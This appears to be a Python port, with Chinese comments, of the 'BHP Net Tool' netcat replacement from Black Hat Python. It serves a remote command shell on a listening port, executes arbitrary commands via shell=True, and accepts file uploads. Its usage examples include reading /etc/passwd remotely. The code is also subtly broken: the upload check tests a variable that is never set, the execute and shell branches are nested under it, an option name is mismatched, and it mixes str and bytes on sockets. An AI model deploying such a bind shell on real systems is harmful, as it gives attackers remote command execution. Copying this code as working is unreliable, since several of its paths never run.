import sys
import socket
import getopt
import threading
import subprocess

#定义全局变量


listen = False
command = False
upload = False
execute = ""
target = ""
uploadDes = ""
port = 0

def usage():
    print("BHP Net Tool")
    print("------------------------------------")
    print("Usage:bhpnet.py -t target_host -p port")
    print("-l --Listen         -listen on [host]:[port] for incomeing connections")
    print("-e --execute=file_to_run ")
    print("-c --command        -initialize a command shell")
    print("-u --upload=destination")
    print("-------------------------------------")
    print("Examples:")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")


    sys.exit(0)


def clientSender(buffer):

    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    try:
        #连接到目标主机
        client.connect((target,port))
        if len(buffer):
            client.send(buffer)

        while True:
            recv_len = 1
            response = ""
            while recv_len:
                data = client.recv(4096)
                recv_len =  len(data)
                response+=data

                if recv_len < 4096:
                    break

            print(response)

            #等待更多的输入
            buffer = input("")
            buffer +="\n"

            #发送出去
            client.send(buffer)

    except:


        print("[*] Exception! Exiting.")

        #关闭连接
        client.close()


def serverLoop():
    global target

    # 如果没有定义目标，那么我们监听所有端口
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    while True:
        cliSocket, addr = server.accept()

        # 分拆一个线程处理新的客户端
        clientThread = threading.Thread(target=clientHandler, args=(cliSocket,))
        clientThread.start()


def run_command(command):
    # 换行
    command = command.rstrip()
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"

    # 将输入发送
    return output


def clientHandler(clientSocket):
    global upload
    global execute
    global command

    # 检测上传文件
    if len(uploadDes):

        # 读取所有的字符并写下目标
        fileBuffer = ""

        # 持续读取数据直到没有符合的数据

        while True:
            data = clientSocket.recv(1024)

            if not data:
                break

            else:
                fileBuffer += data

        # 现在我们接收这些数据并将他们写出来
        try:
            fileDescriptor = open(uploadDes, "wb")
            fileDescriptor.write(fileBuffer)
            fileDescriptor.close()

            # 确认文件已经写出来了
        except:
            clientSocket.send("Failed to save file to %s\r\n" % uploadDes)

        # 检查命令执行
        if len(execute):
            # 运行命令
            output = run_command(execute)
            clientSocket.send(output)

        # 如果需要一个命令行shell,那么我们进入另一个循环
        if command:

            while True:
                # 跳出一个窗口
                clientSocket.send("<BHP:#>")

                # 现在我们接收文件直到发现换行符（enter key）
                cmdBuffer = ""

                while "\n" not in cmdBuffer:
                    cmdBuffer += clientSocket.recv(1024)
                # 返还命令输入
                response = run_command(cmdBuffer)

                # 返回相应数据
                clientSocket.send(response)


def main():
    global listen
    global port
    global execute
    global command
    global uploadDes
    global target

    if not len(sys.argv[1:]):
            usage()
    #读取命令
    try:
            opts,args =getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
            print(str(err))
            usage()

    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c","--commandshell"):
            command = True
        elif o in ("-u","--upload"):
            upload = a
        elif o in ("-t","--target"):
            target = a
        elif o in ("-p","--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"



    if not listen and len(target) and port > 0:
        buffer = sys.stdin.read()

        clientSender(buffer)

    if listen:
        serverLoop()




main()





